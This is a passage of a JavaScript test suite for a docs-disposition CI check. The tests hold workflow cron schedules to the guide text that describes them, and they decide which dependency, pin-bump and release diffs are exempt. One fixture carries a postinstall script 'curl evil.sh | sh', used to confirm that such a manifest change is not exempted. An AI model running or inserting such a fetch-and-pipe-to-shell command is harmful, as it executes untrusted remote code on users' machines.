 * {@link extractHeadingSection}, the one the shipped `extractSection` cuts
 * pull-request bodies with, so a `#` line inside a fenced example neither opens
 * a section nor ends one and the section's own fenced lines come back in it.
 * What this reading states of its own is the two patterns: every call site
 * anchors on a heading written out in full, markers and all, and any heading
 * ends the section.
 */
const headingSection = (text, heading) => {
  const section = extractHeadingSection(
    text,
    new RegExp(`^${escapeForRegExp(heading)}$`),
    /^#{1,6}\s/,
  );
  assert.notEqual(section, null, `expected the heading "${heading}"`);
  return section;
};

/**
 * The trigger cell the CI guide's workflow inventory states for one workflow,
 * read through the shared table reader and selected by the section and header
 * the doc-closure gate names — so a fenced example, an indented row or an
 * escaped pipe cannot answer for the cell under test, and the trigger column is
 * found by its name rather than by where it currently sits.
 */
const triggerCell = (wf) => {
  const tables = parseTables(repoFile(CI_GUIDE)).filter(
    (t) => t.section === WORKFLOW_SECTION && t.header[0] === WORKFLOW_HEADER,
  );
  assert.equal(
    tables.length,
    1,
    `${CI_GUIDE} must carry exactly one "${WORKFLOW_SECTION}" table (found ${tables.length})`,
  );
  const [table] = tables;
  const column = table.header.indexOf(RUNS_ON_HEADER);
  assert.notEqual(
    column,
    -1,
    `${CI_GUIDE}'s workflow table must carry a "${RUNS_ON_HEADER}" column`,
  );
  const rows = table.rows.filter((row) => row[0].includes(wf));
  assert.equal(
    rows.length,
    1,
    `${CI_GUIDE}'s workflow table must carry exactly one row for ${wf} (found ${rows.length})`,
  );
  return rows[0][column];
};

/** The cron line of a workflow that states exactly one, with its comment. */
const cronLine = (wf) => {
  const lines = repoFile(wf)
    .split('\n')
    .filter((line) => /^\s*-\s*cron:/.test(line));
  assert.equal(lines.length, 1, `${wf} must carry exactly one cron line`);
  return lines[0];
};

/**
 * The part of the audit section's heading that names the section. The word the
 * heading opens with is its cadence, and that word is derived from the cron
 * below rather than spelled here — stating the stem alone is what lets the
 * lookup follow a schedule that moves, and what lets the case below say which
 * of the two drifted.
 */
const AUDIT_HEADING_STEM = 'docs-disposition audit';

/** The CI guide section whose closing sentence names the non-blocking checks. */
const INFORMATIONAL_SECTION = '## Required vs informational';

/**
 * Every workflow the CI guide states a scheduled cadence for: the workflow
 * itself, the guide section that describes it — as a whole heading where the
 * words are settled here (the mutation one from the shipped cadence word), and
 * as the stem alone where the cadence word is that workflow's own cron's, so
 * the word is derived inside the case that already reads the cron rather than
 * while this table is built — and the parenthetical trigger phrase that section
 * states, which is what holds the section to its own schedule.
 */
const SCHEDULED_WORKFLOWS = [
  {
    file: MUTATION_WORKFLOW,
    guideHeading: `### ${Cadence} mutation run`,
    triggerPhrase: '(Mondays, plus manual dispatch)',
  },
  {
    file: SCORECARD_WORKFLOW,
    guideHeading: '### Scorecard',
    triggerPhrase: '(Mondays, plus push to `main`, branch-protection changes, and manual dispatch)',
  },
  {
    file: AUDIT_WORKFLOW,
    headingStem: AUDIT_HEADING_STEM,
    triggerPhrase: '(Tuesdays, plus manual dispatch)',
  },
];

/**
 * One entry's guide heading: the whole heading where the table states one, and
 * where it states a stem, that stem behind the cadence word its own cron
 * denotes. Derived here rather than in the table, so a workflow that lost its
 * schedule reds in the cases that read it instead of while the table is built.
 */
const guideHeadingOf = ({ file, guideHeading, headingStem }) =>
  guideHeading ?? `### ${cadenceOf(cronFields(file))} ${headingStem}`;

/** One workflow's row in the table above, refusing readably when it has none. */
const scheduled = (wf) => {
  const row = SCHEDULED_WORKFLOWS.find((entry) => entry.file === wf);
  assert.ok(row, `${wf} must be one of the scheduled workflows these welds read`);
  return row;
};

describe('the mutation cadence — the schedule that is the fact', () => {
  // The standing mutation sentence reports a cadence, and the cadence's
  // authoritative statement is mutation testing §MUT-1; the schedule in
  // .github/workflows/mutation.yml is the fact both describe. These cases read
  // that schedule field by field, so a workflow whose trigger set or timing
  // stopped denoting the stated cadence reds against the word rather than
  // drifting away from every document that spells it.

  it('the mutation workflow states exactly one schedule entry', () => {
    const entries = mutationTriggers().schedule;
    assert.equal(
      entries.length,
      1,
      `${MUTATION_WORKFLOW} must state exactly one schedule entry — a second one adds runs the stated ` +
        `cadence does not account for (found ${entries.length})`,
    );
  });

  it('the mutation workflow triggers are the schedule and the manual dispatch, with no pull_request beside them', () => {
    assert.deepEqual(
      Object.keys(mutationTriggers()).sort(),
      ['schedule', 'workflow_dispatch'],
      `${MUTATION_WORKFLOW} runs on its schedule and on manual dispatch; a trigger added beside them — a ` +
        `pull_request one above all — would make it a per-PR gate, which is exactly what the ` +
        `standing sentence says it is not`,
    );
  });

  it("the mutation cron's day-of-week is one fixed day, not the wildcard '*'", () => {
    assert.notEqual(
      cronFields().dow,
      '*',
      `${MUTATION_WORKFLOW}: an unrestricted day-of-week runs daily`,
    );
  });

  it("the mutation cron's day-of-week is one fixed day, not a list like '1,4'", () => {
    const { dow } = cronFields();
    assert.ok(
      !dow.includes(','),
      `${MUTATION_WORKFLOW}: a day-of-week list runs more than once a week`,
    );
  });

  it("the mutation cron's day-of-week is one fixed day, not a range like '1-5'", () => {
    const { dow } = cronFields();
    assert.ok(
      !dow.includes('-'),
      `${MUTATION_WORKFLOW}: a day-of-week range runs more than once a week`,
    );
  });

  it("the mutation cron's day-of-week is one fixed day, not a step like '*/2'", () => {
    const { dow } = cronFields();
    assert.ok(
      !dow.includes('/'),
      `${MUTATION_WORKFLOW}: a day-of-week step runs more than once a week`,
    );
  });

  it("the mutation cron's minute and hour are fixed numbers, not wildcards or steps", () => {
    const { minute, hour } = cronFields();
    assert.match(
      minute,
      /^\d+$/,
      `${MUTATION_WORKFLOW}: a minute that is not one number runs hourly or more`,
    );
    assert.match(
      hour,
      /^\d+$/,
      `${MUTATION_WORKFLOW}: an hour that is not one number runs several times a day`,
    );
  });

  it('the mutation cron restricts neither day-of-month nor month', () => {
    const { dom, month } = cronFields();
    assert.equal(
      dom,
      '*',
      `${MUTATION_WORKFLOW}: a restricted day-of-month makes the run monthly, not weekly`,
    );
    assert.equal(
      month,
      '*',
      `${MUTATION_WORKFLOW}: a restricted month makes the run yearly, not weekly`,
    );
  });

  it('the mutation cron denotes the cadence the standing sentence reports', () => {
    // What the field cases above add up to: one fixed time, on one named day,
    // every week. That reading is the word the standing sentence spells and the
    // documents restate — so the word is held to the weekly-shaped predicates
    // those cases form, not to itself, and the bind below is their anchor.
    const { dow } = cronFields();
    assert.match(
      dow,
      /^[0-6]$/,
      `${MUTATION_WORKFLOW}: the day-of-week must name one day — that is what "${MUTATION_CADENCE}" means`,
    );
    assert.equal(
      MUTATION_CADENCE,
      'weekly',
      'the exported cadence word is bound here to the weekly-shaped schedule predicates around it ' +
        '— one fixed day-of-week, day-of-month and month unrestricted — so a cadence change reds ' +
        'at this bind first, as the signal that those predicates have to be re-derived for the new ' +
        'cadence rather than left standing',
    );
  });

  it("the cron's own comment states the day and time the cron sets", () => {
    // The comment is what a reader of the workflow believes; nothing else holds
    // it to the fields beside it, so a schedule moved without its comment leaves
    // the file stating two different runs.
    const line = cronLine(MUTATION_WORKFLOW);
    assert.ok(line.includes('#'), `${MUTATION_WORKFLOW}: the cron line must carry its comment`);
    const comment = line.slice(line.indexOf('#'));
    const { minute, hour } = cronFields();
    const day = scheduledDay();
    const time = `${String(hour).padStart(2, '0')}:${String(minute).padStart(2, '0')}`;
    assert.ok(
      comment.includes(day),
      `${MUTATION_WORKFLOW}: the cron comment must name ${day}, the day its own day-of-week field sets (comment: "${comment.trim()}")`,
    );
    assert.ok(
      comment.includes(time),
      `${MUTATION_WORKFLOW}: the cron comment must state ${time}, the time its own fields set (comment: "${comment.trim()}")`,
    );
  });
});

describe('the mutation cadence — the prose surfaces welded to it', () => {
  // Each site below DESCRIBES the workflow's schedule to a contributor or a
  // user, so each is held to the schedule's own reading. A site that refers to a
  // run as an event inside explanatory rationale describes no schedule and stays
  // outside. Every weld is anchored at its own site — a file-wide search for the
  // word would pass off a mention somewhere else in the same document.
  it('CONTRIBUTING.md spells the standing mutation sentence verbatim', () => {
    // The doctrine home prescribes the exact text a contributor pastes, and the
    // check's red offers that same text as the fix — so the two are one string.
    const section = extractSection(
      repoFile('.github/CONTRIBUTING.md'),
      'Docs Disposition and Change Record',
    );
    assert.notEqual(section, null, 'CONTRIBUTING.md must carry that section');
    const shown = section
      .split('\n')
      .map((line) => line.trim())
      .filter((line) => line.startsWith('`mutation:') || line.startsWith('mutation:'));
    assert.equal(
      shown.length,
      1,
      `CONTRIBUTING.md's change-record section must spell the standing sentence exactly once (found ${shown.length})`,
    );
    assert.equal(shown[0].replace(/^`|`$/g, ''), MUTATION_LINE);
  });

  it('the PR template scaffolds the standing mutation sentence verbatim', () => {
    const section = extractSection(repoFile('.github/PULL_REQUEST_TEMPLATE.md'), 'Change record');
    assert.notEqual(section, null, 'the template must carry a "## Change record" section');
    const shown = section
      .split('\n')
      .map((line) => line.trim())
      .filter((line) => line.startsWith('mutation:'));
    assert.equal(
      shown.length,
      1,
      `the PR template's Change-record comment must scaffold the standing sentence exactly once (found ${shown.length})`,
    );
    assert.equal(shown[0], MUTATION_LINE);
  });

  it('the standing sentence opens with the change-record marker it is written for', () => {
    const opening = CHANGE_RECORD_MARKERS.filter((marker) => MUTATION_LINE.startsWith(marker));
    assert.deepEqual(
      opening,
      ['mutation:'],
      "the standing sentence must satisfy the change record's mutation marker by opening with it",
    );
  });

  it('MUT-1 states the cadence, and states no other', () => {
    // The clause is the cadence's authoritative statement, so its own scope is
    // where the word is held — and where a second, contradicting cadence word
    // would otherwise sit unnoticed beside it. The bound of the negative leg:
    // it catches a contradicting word from the stated vocabulary sitting beside
    // the pinned sentence, and a novel phrasing of a second cadence is review's
    // to catch. The positive leg above is what pins the stated cadence itself.
    const section = extractClauseSection(repoFile(MUTATION_DOC), 'MUT-1');
    assert.notEqual(section, '', `${MUTATION_DOC} must carry a MUT-1 clause`);
    assert.match(
      section,
      new RegExp(`standing \\*\\*${MUTATION_CADENCE}\\*\\* job`),
      `${MUTATION_DOC} §MUT-1 must state the cadence the schedule denotes`,
    );
    for (const other of CADENCE_VOCABULARY.filter((word) => word !== MUTATION_CADENCE)) {
      assert.ok(
        !section.toLowerCase().includes(other),
        `${MUTATION_DOC} §MUT-1 must not also say "${other}"`,
      );
    }
  });

  it('the CI guide’s workflow table states the cadence and the scheduled day', () => {
    const when = triggerCell(MUTATION_WORKFLOW);
    assert.ok(
      when.startsWith(`${Cadence} (${scheduledDay()}s)`),
      `${CI_GUIDE}: the ${MUTATION_WORKFLOW} row's trigger cell must open "${Cadence} (${scheduledDay()}s)" (found "${when}")`,
    );
  });

  it('the CI guide’s scheduled-run heading states the cadence, and both inbound anchors match its slug', () => {
    // The heading carries the word AND the anchor every cross-reference lands
    // on, so a reworded heading is two breakages at once: a cadence claim and a
    // pair of links. Deriving the slug from the heading holds both.
    const ci = repoFile(CI_GUIDE);
    const { guideHeading: heading } = scheduled(MUTATION_WORKFLOW);
    const headings = ci.split('\n').filter((line) => line === heading);
    assert.equal(
      headings.length,
      1,
      `${CI_GUIDE} must carry exactly one "${heading}" heading (found ${headings.length})`,
    );
    const slug = heading
      .replace(/^#+\s+/, '')
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, '-');
    assert.ok(
      ci.includes(`(#${slug})`),
      `${CI_GUIDE} must link its own scheduled-run section as (#${slug})`,
    );
    assert.ok(
      repoFile(LOCAL_CI_GUIDE).includes(`ci.md#${slug}`),
      `${LOCAL_CI_GUIDE} must link that section as ci.md#${slug}`,
    );
  });

  it('the local-CI guide describes the mutation jobs by their cadence', () => {
    const section = headingSection(repoFile(LOCAL_CI_GUIDE), '### The mutation runs');
    assert.ok(
      section.replace(/\s+/g, ' ').includes(`${MUTATION_CADENCE} jobs`),
      `${LOCAL_CI_GUIDE}'s mutation-runs section must describe them as the ${MUTATION_CADENCE} jobs`,
    );
  });

  it('the test-suite index describes the mutation signal by its cadence', () => {
    const bullets = repoFile('docs/test/README.md')
      .split('\n')
      .filter((line) => line.trimStart().startsWith('-') && line.includes('strategy/mutation.md'));
    assert.equal(
      bullets.length,
      1,
      `docs/test/README.md must carry exactly one bullet linking the mutation-strategy doc (found ${bullets.length})`,
    );
    assert.ok(
      bullets[0].includes(`the ${MUTATION_CADENCE} mutation-score`),
      `docs/test/README.md's mutation bullet must describe the ${MUTATION_CADENCE} signal (found "${bullets[0].trim()}")`,
    );
  });
});

describe('headingSection — the extent a weld anchors in, fences and all', () => {
  it('a fenced heading line neither ends the section nor drops out of it', () => {
    // A recipe block inside a section is ordinary in these guides, and a `#`
    // line inside one is a shell comment, not a heading. Reading the boundaries
    // off the defenced view keeps the section whole; slicing the raw text keeps
    // the recipe's own lines in it.
    const doc = [
      '# Doc',
      '',
      '### Guides',
      '',
      'before',
      '',
      '```text',
      '# not a heading',
      '```',
      '',
      'after',
      '',
      '### Next',
      '',
      'outside',
      '',
    ].join('\n');
    const section = headingSection(doc, '### Guides');
    assert.match(section, /before/);
    assert.match(section, /after/, 'a fenced `#` line must not end the section');
    assert.match(section, /# not a heading/, "the section's fenced lines come back intact");
    assert.doesNotMatch(section, /outside/);
  });
});

describe('the scheduled cadences — every guide cell welded to its own cron', () => {
  // Each workflow below runs on a schedule the CI guide describes twice — as a
  // table cell and in the section that explains it — and the cron field is the
  // fact both describe. Every day name here is derived from that field, so a
  // schedule moved without its prose reds at the site now saying something else.

  it('the cron-derived cadence word and the shipped one are the same word', () => {
    // The mutation row's cell and heading cases read the word the check exports;
    // the rows beside it read the word their own cron denotes. This is where the
    // two homes meet, so neither can move without the other.
    assert.equal(
      cadenceOf(cronFields(MUTATION_WORKFLOW)),
      Cadence,
      `the cadence ${MUTATION_WORKFLOW}'s cron denotes must be the word the check exports`,
    );
  });

  for (const { file, guideHeading, headingStem, triggerPhrase } of SCHEDULED_WORKFLOWS) {
    it(`${file} states exactly one schedule entry`, () => {
      const entries = workflowTriggers(file).schedule;
      assert.equal(
        entries.length,
        1,
        `${file} must state exactly one schedule entry — a second one adds runs the guide's cell does not account for (found ${entries.length})`,
      );
    });

    it(`${file}'s cron names one day a week`, () => {
      const { dow, dom, month } = cronFields(file);
      assert.match(dow, /^[0-6]$/, `${file}: the day-of-week must name one day`);
      assert.equal(
        dom,
        '*',
        `${file}: a restricted day-of-month makes the run monthly, not weekly`,
      );
      assert.equal(month, '*', `${file}: a restricted month makes the run yearly, not weekly`);
    });

    it(`the CI guide's table row for ${file} opens with the cadence and day its cron sets`, () => {
      const opening = `${cadenceOf(cronFields(file))} (${scheduledDay(file)}s)`;
      const when = triggerCell(file);
      assert.ok(
        when.startsWith(opening),
        `${CI_GUIDE}: the ${file} row's trigger cell must open "${opening}" (found "${when}")`,
      );
    });

    it(`the CI guide's section for ${file} states the trigger phrase its cron denotes`, () => {
      // The phrase is pinned verbatim, so a reworded trigger sentence reds here
      // rather than passing on the day alone; whitespace runs collapse on both
      // sides, since the guide may wrap a phrase across lines.
      const day = scheduledDay(file);
      assert.ok(
        triggerPhrase.startsWith(`(${day}s, `),
        `the trigger phrase for ${file} must open with ${day}s, the day its cron sets (phrase: "${triggerPhrase}")`,
      );
      const heading = guideHeadingOf({ file, guideHeading, headingStem });
      const section = headingSection(repoFile(CI_GUIDE), heading).replace(/\s+/g, ' ');
      assert.ok(
        section.includes(triggerPhrase.replace(/\s+/g, ' ')),
        `${CI_GUIDE}'s "${heading}" section must state "${triggerPhrase}"`,
      );
    });

    // The entries stating a heading stem carry this weld and the prose one
    // after it, each owed for its own reason. The heading weld: the stem is
    // what finds a heading whose cadence word has moved, and an entry stating
    // none is not owed it — the Scorecard heading states no cadence at all, and
    // the mutation heading is derived in full from the shipped cadence word, so
    // the lookup that must find it is itself the weld. The prose weld: the
    // informational-checks sentence names Scorecard and the `cargo-mutants` job
    // with no cadence word at all, so those entries state no prose claim to
    // hold — one whose sentence gained a cadence would owe a stem.
    if (headingStem)
      it(`the CI guide's ${file} heading opens with the cadence its own cron denotes`, () => {
        // The heading is a cadence claim in its own right, and the anchor every
        // inbound link is cut from. Finding it by its stem rather than in full
        // keeps two failures apart that a whole-heading lookup reports as one:
        // a section renamed away from the stem, and a cadence word a moved
        // schedule left standing. A changed word and a deleted one both red.
        const opening = new RegExp(`^###\\s+(\\S*)\\s*${escapeForRegExp(headingStem)}$`, 'i');
        const found = repoFile(CI_GUIDE)
          .split('\n')
          .map((line) => opening.exec(line))
          .filter(Boolean);
        assert.equal(
          found.length,
          1,
          `${CI_GUIDE} must carry exactly one "${headingStem}" heading (found ${found.length})`,
        );
        const cadence = cadenceOf(cronFields(file));
        assert.equal(
          found[0][1],
          cadence,
          `${CI_GUIDE}: the "${headingStem}" heading must open with "${cadence}", the cadence ${file}'s cron denotes (found "${found[0][0].trim()}")`,
        );
      });

    // The same cadence claim restated in prose: the informational-checks
    // sentence names this workflow by its cadence too. The read is scoped to
    // that section, so the heading above cannot answer for it, and the word is
    // lower-cased because a sentence spells it as a sentence does. A word
    // changed reds on the comparison; one deleted reds on the count, there
    // being no such mention left to find.
    if (headingStem)
      it(`the CI guide's informational-checks sentence names ${file} by its own cron's cadence`, () => {
        const section = headingSection(repoFile(CI_GUIDE), INFORMATIONAL_SECTION).replace(/\s+/g, ' '); // prettier-ignore
        const mention = new RegExp(`the (\\S+) ${escapeForRegExp(headingStem)}`, 'g');
        const found = [...section.matchAll(mention)];
        assert.equal(
          found.length,
          1,
          `${CI_GUIDE}'s "${INFORMATIONAL_SECTION}" section must name the "${headingStem}" with a cadence before it (found ${found.length})`,
        );
        const cadence = cadenceOf(cronFields(file)).toLowerCase();
        assert.equal(
          found[0][1],
          cadence,
          `${CI_GUIDE}: the "${headingStem}" mention in "${INFORMATIONAL_SECTION}" must state "${cadence}", the cadence ${file}'s cron denotes (found "${found[0][1]}")`,
        );
      });

    it(`${file}'s cron comment states the day and time its own fields set`, () => {
      const line = cronLine(file);
      assert.ok(line.includes('#'), `${file}: the cron line must carry its comment`);
      const comment = line.slice(line.indexOf('#'));
      const { minute, hour } = cronFields(file);
      const day = scheduledDay(file);
      const time = `${String(hour).padStart(2, '0')}:${String(minute).padStart(2, '0')}`;
      assert.ok(
        comment.includes(day),
        `${file}: the cron comment must name ${day}, the day its own day-of-week field sets (comment: "${comment.trim()}")`,
      );
      assert.ok(
        comment.includes(time),
        `${file}: the cron comment must state ${time}, the time its own fields set (comment: "${comment.trim()}")`,
      );
    });
  }
});

describe('isDependencyOnlyCargoTomlDiff', () => {
  it('accepts a bump inside [dependencies] and rejects one outside', () => {
    const inside = diff([' [dependencies]', '-serde = "1.0.0"', '+serde = "1.0.1"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(inside), true);
    const outside = diff([' [package]', '-version = "1.0.0"', '+version = "2.0.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(outside), false);
  });

  it('needs the section header in the hunk — a false negative without it (same fix as package.json)', () => {
    const withHeader = diff([
      ' [dependencies]',
      ' serde = "1.0.0"',
      '-tokio = "1.0.0"',
      '+tokio = "1.1.0"',
    ]);
    assert.equal(isDependencyOnlyCargoTomlDiff(withHeader), true);
    const headerDropped = diff([' serde = "1.0.0"', '-tokio = "1.0.0"', '+tokio = "1.1.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(headerDropped), false);
  });

  it('accepts every dependency-section form Cargo defines — table, target, workspace', () => {
    // The per-crate table form is how a dependency with options is written, so a
    // bump inside one is the same dependency data as the inline form.
    const bumpIn = (header) => diff([` ${header}`, '-version = "1.0.0"', '+version = "1.0.1"']);
    for (const header of [
      '[dependencies.serde]',
      "[target.'cfg(windows)'.dependencies]",
      '[target.x86_64-pc-windows-msvc.dev-dependencies]',
      '[workspace.dependencies.serde]',
      '[workspace.dependencies]',
      '[build-dependencies.cc]',
    ]) {
      assert.equal(
        isDependencyOnlyCargoTomlDiff(bumpIn(header)),
        true,
        `expected a bump inside ${header} to be dependency-only`,
      );
    }
  });

  it('rejects the open third-party namespaces that merely end in a dependency-shaped name', () => {
    // [package.metadata.*] and [lints.*] hold arbitrary tool data — a change
    // there is a real change, whatever the table happens to be called.
    const changeIn = (header) => diff([` ${header}`, '-x = "1"', '+x = "2"']);
    for (const header of [
      '[package]',
      '[profile.release]',
      '[package.metadata.dependencies]',
      '[package.metadata.docs.rs.dependencies]',
      '[lints.dependencies]',
      '[profile.release.package.dependencies]',
      '[dependencies-extra]',
    ]) {
      assert.equal(
        isDependencyOnlyCargoTomlDiff(changeIn(header)),
        false,
        `expected a change inside ${header} to carry the sections`,
      );
    }
  });
});

describe('isExemptDiff — the declared classes that skip the sections', () => {
  const depBump = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
  const pinBump = diff([
    `-      - uses: actions/checkout@${SHA_A}`,
    `+      - uses: actions/checkout@${SHA_B}`,
  ]);

  it('exempts a pure-lockfile diff on its own', () => {
    assert.equal(isExemptDiff({ files: ['package-lock.json'], fileDiff: () => 'anything' }), true);
  });

  it('exempts lockfiles, dependency-field manifest bumps, and pin bumps together', () => {
    const diffs = {
      'package-lock.json': 'anything',
      'packages/extension/package.json': depBump,
      '.github/workflows/test.yml': pinBump,
      'packages/desktop/src-tauri/Cargo.lock': 'anything',
    };
    assert.equal(isExemptDiff({ files: Object.keys(diffs), fileDiff: (f) => diffs[f] }), true);
  });

  it('does not exempt a manifest whose diff leaves the dependency-resolution fields', () => {
    const scripts = jdiff(
      BASE_PKG,
      pkgWith({ scripts: { build: 'x', postinstall: 'curl evil.sh | sh' } }),
    );
    assert.equal(isExemptDiff({ files: ['package.json'], fileDiff: () => scripts }), false);
  });

  it('does not exempt a nested YAML — the workflow boundary is one directory deep', () => {
    // The pin-bump class is scoped to the files the platform runs as workflows:
    // tracked YAML DIRECTLY under the workflows directory. A file one level
    // deeper is not one, so the same pin-shaped diff earns no exemption there.
    assert.equal(
      isExemptDiff({
        files: ['.github/workflows/reusable/build.yml'],
        fileDiff: () => pinBump,
      }),
      false,
    );
  });

  it('welds its workflow-file literal to the boundary’s one home', () => {
    // The literal is a deliberate second copy — importing the boundary would
    // add a YAML parser, and check-ci-filter.js which brings the same parser,
    // to the command line that runs on every pull request — so the two are held
    // equal as TEXT instead. Read from the script's own source, since the check
    // never imports it.
    const source = repoFile('scripts/check-docs-disposition.js');
    const written = source.match(/if \((\/\^\\\.github[^)]*?\/)\.test\(f\)\)/);
    assert.ok(written, 'the workflow-file literal moved — re-anchor this weld');
    assert.equal(
      written[1].slice(1, -1),
      WORKFLOW_FILE_RE.source,
      'the copied literal and the boundary its home states have drifted apart',
    );
  });

  it('does not exempt mixed diffs or empty file lists', () => {
    assert.equal(
      isExemptDiff({
        files: ['package-lock.json', 'packages/alpha/index.js'],
        fileDiff: () => depBump,
      }),
      false,
    );
    assert.equal(isExemptDiff({ files: [], fileDiff: () => '' }), false);
  });

  it('names the admitting class, keeping the dependency classes under one name', () => {
    assert.equal(
      exemptionClass({ files: ['package-lock.json'], fileDiff: () => 'anything' }),
      DEPENDENCY_ONLY_CLASS,
    );
    assert.equal(
      exemptionClass({
        files: ['README.md'],
        fileDiff: () => '',
        headRef: AUTOMATED_BRANCH,
      }),
      RELEASE_AUTOMATION_CLASS,
    );
    assert.equal(exemptionClass({ files: ['packages/alpha/index.js'], fileDiff: () => '' }), null);
  });
});

describe('isReleaseAutomationDiff — the release pipeline’s own regeneration PR', () => {
  // Release outputs, including a leaf delta file (the version the pipeline bumps).
  const RELEASE_FILES = [
    'schemas/dist/extension.schema.json',
    'schemas/extension.delta.json',
    'README.md',
    'docs/technical/session-format.md',
    'packages/extension/manifest.json',
  ];

  it('admits the automation branch when every changed file is a release output', () => {
    assert.equal(
      isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: AUTOMATED_BRANCH }),
      true,
    );
    assert.equal(
      isExemptDiff({ files: RELEASE_FILES, fileDiff: () => '', headRef: AUTOMATED_BRANCH }),
      true,
    );
  });

  it('admits nothing when the head ref is another branch, or is not supplied at all', () => {
    // The derivation names a branch only for a pull request opened on this
    // repository, so every other one arrives here with the empty string — and
    // existing callers pass none.
    assert.equal(isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: 'feature/x' }), false);
    assert.equal(isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: '' }), false);
    assert.equal(isExemptDiff({ files: RELEASE_FILES, fileDiff: () => '' }), false);
  });

  it('rejects a file outside the release-output surface riding along on that branch', () => {
    assert.equal(
      isReleaseAutomationDiff({
        files: [...RELEASE_FILES, 'packages/extension/background/worker.js'],
        headRef: AUTOMATED_BRANCH,
      }),
      false,
    );
  });

  it('rejects an empty file list', () => {
    assert.equal(isReleaseAutomationDiff({ files: [], headRef: AUTOMATED_BRANCH }), false);
  });

  it('leaves the dependency class deciding from the diff alone, head ref or not', () => {
    const depBump = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
    assert.equal(isDependencyOnlyDiff({ files: ['package.json'], fileDiff: () => depBump }), true);
    assert.equal(
      exemptionClass({
        files: ['package.json'],
        fileDiff: () => depBump,
        headRef: AUTOMATED_BRANCH,
      }),
      DEPENDENCY_ONLY_CLASS,
    );
  });
});

describe('run() manifest exemption — full-file context so the block opener is never dropped', () => {
  // Regression: the disposition gate demanded sections for a pure dependabot
  // devDependency bump because git's default 3-line context drops the
  // "devDependencies": {" opener when the changed entry sits more than a few lines
  // below it, so isDependencyOnlyPackageJsonDiff misjudged it as a change outside a
  // dependency block. Dependabot cannot add the demanded sections.
  // Surfaced by https://github.com/Arsarneq/docent/pull/268

  /**
   * A package.json whose bumped devDependency sits many lines below the block
   * opener — deep enough that any realistic reduction of the diff context (not
   * just the default 3) would drop the opener and reintroduce the bug.
   */
  const pkg = (ver) => {
    const devDependencies = {};
    for (let i = 0; i < 24; i++) devDependencies[`filler-${String(i).padStart(2, '0')}`] = '^1.0.0';
    devDependencies['markdownlint-cli2'] = ver;
    devDependencies['z-last'] = '^1.0.0';
    return (
      JSON.stringify(
        {
          name: 'fixture',
          version: '1.0.0',
          private: true,
          scripts: { build: 'x' },
          devDependencies,
        },
        null,
        2,
      ) + '\n'
    );
  };

  /**
   * Commit `beforeText` as package.json in a throwaway git repo, commit
   * `afterText` over it, and run the check CLI against that one-file diff with
   * an empty PR body (exempt diffs must pass with no disposition sections).
   * @returns {{ status: number | null, stdout: string, stderr: string }}
   */
  const runCheckOnManifestChange = (beforeText, afterText) => {
    const tmp = mkdtempSync(path.join(os.tmpdir(), 'ddisp-'));
    try {
      const g = (args) => execFileSync('git', args, { cwd: tmp, encoding: 'utf8' });
      g(['init', '-q', '-b', 'main']);
      g(['config', 'user.email', 't@example.com']);
      g(['config', 'user.name', 'Test']);
      writeFileSync(path.join(tmp, 'package.json'), beforeText);
      g(['add', '.']);
      g(['commit', '-qm', 'base']);
      const base = g(['rev-parse', 'HEAD']).trim();
      writeFileSync(path.join(tmp, 'package.json'), afterText);
      g(['add', '.']);
      g(['commit', '-qm', 'change']);
      return spawnSync('node', [SCRIPT, base], {
        cwd: tmp,
        env: { ...process.env, ...NO_AUTOMATION_CONTEXT, PR_BODY: '' },
        encoding: 'utf8',
      });
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  };

  it('regression_268_dep_bump_far_below_block_opener_is_exempt', () => {
    const r = runCheckOnManifestChange(pkg('^0.22.1'), pkg('^0.23.0'));
    assert.equal(
      r.status,
      0,
      `expected the dependency bump to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });

  it('regression_402_nested_override_diff_is_exempt_end_to_end', () => {
    // Regression: PR #402 scoped two minimatch overrides to their dependents —
    // nested override objects, pure dependency-resolution data — and the gate
    // demanded the full disposition sections anyway (the then line-based
    // exemption accepted only flat "name": "range" entries inside a block).
    // https://github.com/Arsarneq/docent/pull/402
    const manifest = (overrides) =>
      JSON.stringify(
        { name: 'fixture', version: '1.0.0', private: true, scripts: { build: 'x' }, overrides },
        null,
        2,
      ) + '\n';
    const r = runCheckOnManifestChange(
      manifest({ 'js-yaml': '^4.2.0', qs: '^6.15.2' }),
      manifest({
        '@npmcli/config': { minimatch: '^10.0.3' },
        'js-yaml': '^4.2.0',
        qs: '^6.15.2',
        'unified-engine': { minimatch: '^10.0.3' },
      }),
    );
    assert.equal(
      r.status,
      0,
      `expected the nested-override diff to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });
});

describe('run() release-automation class — which runs it admits, and the publish workflows it is welded to', () => {
  /**
   * The values a publish workflow states for one input key, read through YAML
   * so each is the value the action receives rather than the spelling the
   * formatter chose to write it in.
   * @param {string} workflowFile repo-relative workflow path
   * @param {string} key the input key to collect
   * @returns {unknown[]} every value stated under that key, document order
   */
  const statedValues = (workflowFile, key) => {
    const walk = (node, found) => {
      if (Array.isArray(node)) {
        for (const item of node) walk(item, found);
        return found;
      }
      if (typeof node !== 'object' || node === null) return found;
      for (const [name, value] of Object.entries(node)) {
        if (name === key) found.push(value);
        else walk(value, found);
      }
      return found;
    };
    return walk(yaml.load(repoFile(workflowFile)), []);
  };

  /**
   * The body a publish workflow generates for its automation PR.
   * @param {string} [workflowFile] repo-relative workflow path
   */
  const generatedBody = (workflowFile = '.github/workflows/publish.yml') => {
    const values = statedValues(workflowFile, 'body');
    assert.equal(
      values.length,
      1,
      `${workflowFile} must state exactly one \`body:\` key — the automation PR body ` +
        `(found ${values.length})`,
    );
    return values[0];
  };

  /**
   * The head branch a publish workflow opens its automation PR on.
   * @param {string} [workflowFile] repo-relative workflow path
   */
  const declaredBranch = (workflowFile = '.github/workflows/publish.yml') => {
